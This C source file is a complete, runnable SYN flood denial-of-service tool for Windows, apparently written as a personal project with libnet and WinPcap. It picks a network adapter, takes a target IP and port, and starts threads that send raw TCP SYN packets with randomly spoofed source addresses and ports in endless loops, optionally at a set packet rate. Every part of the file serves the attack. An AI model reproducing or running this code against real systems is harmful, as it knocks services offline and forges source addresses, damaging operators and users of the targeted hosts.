/*
author: Forec
last edit date: 2016/11/20
email: forec@bupt.edu.cn
LICENSE
Copyright (c) 2015-2017, Forec <forec@bupt.edu.cn>

Permission to use, copy, modify, and/or distribute this code for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

#include <sys/utime.h>
#include <libnet.h>
#include "wingetopt.h"
#include <windows.h>
#include <process.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#pragma pack (1)

#pragma comment(lib,"wpcap.lib")
#pragma comment(lib,"ws2_32.lib")
#define PCAP_OPENFLAG_PROMISCUOUS 1

char errbuf[PCAP_ERRBUF_SIZE];
char name[1001];

#define libnet_timersub(tvp, uvp, vvp)                      \
do {                                                        \
	(vvp)->tv_sec = (tvp)->tv_sec - (uvp)->tv_sec;          \
    (vvp)->tv_usec = (tvp)->tv_usec - (uvp)->tv_usec;       \
    if ((vvp)->tv_usec < 0) {                               \
        (vvp)->tv_sec--;                                    \
        (vvp)->tv_usec += 1000000;                          \
    }                                                       \
} while (0)

int select_adapter(pcap_t **handle) {
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum, i=0;

	if(pcap_findalldevs(&alldevs, errbuf) == -1){
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	for(d = alldevs; d; d = d->next){
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}
	if(!i){
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}
	printf("Choose the interface (1-%d):",i);
	scanf_s("%d", &inum);
	
	if(inum < 1 || inum > i){
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	
	/* Jump to the selected adapter */
	for(d = alldevs, i = 0; i < inum-1 ; d = d->next, i++);

	if ((*handle= pcap_open_live(
		d->name,	// name of the device
		65536,		// portion of the packet to capture. 
					// 65536 grants that the whole packet will be captured on all the MACs.
		PCAP_OPENFLAG_PROMISCUOUS,				
					// promiscuous mode (nonzero means promiscuous)
		1000,		// read timeout
		errbuf		// error buffer
		)) == NULL){
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		pcap_freealldevs(alldevs);
		return -1;
	}
	strcpy_s(name,d->name);
	printf("Successfully Open the adapter <%s> \n", d->description);
	return TRUE;
}

int gettimeofday(struct timeval * tp, struct timezone * tzp){
	static const uint64_t EPOCH = ((uint64_t)116444736000000000ULL);
	SYSTEMTIME  system_time;
	FILETIME    file_time;
	uint64_t    time;

	GetSystemTime(&system_time);
	SystemTimeToFileTime(&system_time, &file_time);
	time = ((uint64_t)file_time.dwLowDateTime);
	time += ((uint64_t)file_time.dwHighDateTime) << 32;

	tp->tv_sec = (long)((time - EPOCH) / 10000000L);
	tp->tv_usec = (long)(system_time.wMilliseconds * 1000);
	return 0;
}

u_long dst_ip   = 0;
u_short dst_prt = 0;
int speed = 0;

struct t_pack{
    struct libnet_ipv4_hdr ip;
    struct libnet_tcp_hdr tcp;
};

void usage(char *nomenclature){
    fprintf(stderr,
        "\nusage: %s -t [-s -p]\n"
        "\t-t target (ip.address.port: 192.168.1.193.80)\n"
        "\t-s number of packets to send per second (defaults to max speed)\n"
        "\t-p number of threads to send packets (defaults to 1)\n" , nomenclature);
}

// Send SYN Packet Thread
unsigned int __stdcall send_syn(PVOID argv){
	struct timeval r;
	struct timeval s;
	struct timeval e;
	libnet_ptag_t t = LIBNET_PTAG_INITIALIZER;
	u_int32_t src_ip;
	char errbuf[LIBNET_ERRBUF_SIZE];
	u_short src_prt;

	libnet_t *l = libnet_init(
			LIBNET_RAW4,                     /* injection type */
			name,                            /* network interface */
			errbuf);                         /* errbuf */
	if (l == NULL){
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		return 0;
	}
    libnet_seed_prand(l);

	if(speed == 0){
	    while (1){
            t = libnet_build_tcp(
                    src_prt = libnet_get_prand(LIBNET_PRu16),
                    dst_prt,
                    libnet_get_prand(LIBNET_PRu32), // sequence number
                    0,								// acknowledgement num
                    TH_SYN,
                    libnet_get_prand(LIBNET_PRu16), // window size
                    0,
                    0,
                    LIBNET_TCP_H,
                    NULL,
                    0,
                    l,
                    0);
            
			libnet_build_ipv4(
                LIBNET_TCP_H + LIBNET_IPV4_H,
                0,
                libnet_get_prand(LIBNET_PRu16),
                0,
                libnet_get_prand(LIBNET_PR8),
                IPPROTO_TCP,
                0,
				src_ip = libnet_get_prand(LIBNET_PRu32), 
                dst_ip,
                NULL,
                0,
                l,
                0);
            int c = libnet_write(l);
            if (c == -1){
                fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
            }
            libnet_clear_packet(l);
		}
	} else {
		while (1){
			gettimeofday(&s, NULL);
			for(int i = 0; i < speed; i++){
				t = libnet_build_tcp(
						src_prt = libnet_get_prand(LIBNET_PRu16),
						dst_prt,
						libnet_get_prand(LIBNET_PRu32), // sequence number
						0,                              // acknowledgement num
						TH_SYN,
						libnet_get_prand(LIBNET_PRu16), // window size
						0,
						0,
						LIBNET_TCP_H,
						NULL,
						0,
						l,
						t);
				libnet_build_ipv4(
					LIBNET_TCP_H + LIBNET_IPV4_H,
					0,
					libnet_get_prand(LIBNET_PRu16),
					0,
					libnet_get_prand(LIBNET_PR8),
					IPPROTO_TCP,
					0,
					src_ip = libnet_get_prand(LIBNET_PRu32), 
					dst_ip,
					NULL,
					0,
					l,
					0);
				int c = libnet_write(l);
				if (c == -1) {
					fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
				}
				libnet_clear_packet(l);
			}
			gettimeofday(&e, NULL);
			libnet_timersub(&e, &s, &r);
			if (r.tv_sec < 1) {
				Sleep((1000000 - r.tv_usec)/1000);
			}
		}
	}
	libnet_destroy(l);
	return 1;
}

int main(int argc, char **argv) {
    libnet_t *l;
    char *cp;
    char errbuf[LIBNET_ERRBUF_SIZE];
    int c, whole_speed = 0, thread_num = 1;
	pcap_t *handle = 0;

	select_adapter(&handle);
    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            name,                                   /* network interface */
            errbuf);                                /* error buffer */

    if (l == NULL){
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }

    while((c = getopt(argc, argv, "t:s:p:")) != EOF){
        switch (c) {
            /*
             *  We expect the input to be of the form `ip.ip.ip.ip.port`.  We
             *  point cp to the last dot of the IP address/port string and
             *  then seperate them with a NULL byte.  The optarg now points to
             *  just the IP address, and cp points to the port.
             */
            case 't':
                if (!(cp = strrchr(optarg, '.'))){
                    usage(argv[0]);
                    exit(EXIT_FAILURE);
                }
                *cp++ = 0;
                dst_prt = (u_short)atoi(cp);
                if ((dst_ip = libnet_name2addr4(l, optarg, 1)) == -1){
                    fprintf(stderr, "Bad IP address: %s\n", optarg);
                    exit(EXIT_FAILURE);
                }
                break;
            case 's':
                whole_speed = atoi(optarg);
                break;
            case 'p':
                thread_num   = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }
    libnet_destroy(l);
    
    if (!dst_prt || !dst_ip){
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }
    speed = whole_speed / thread_num;
    
    for(int i = 0; i < thread_num; i++){
		HANDLE handle = (HANDLE)_beginthreadex(NULL, 0, send_syn, NULL, 0, NULL);
		if (handle < 0){
			printf("can't create send_syn thread!\n");
		}
		Sleep(1000);
	}
    Sleep(1200*1000);
}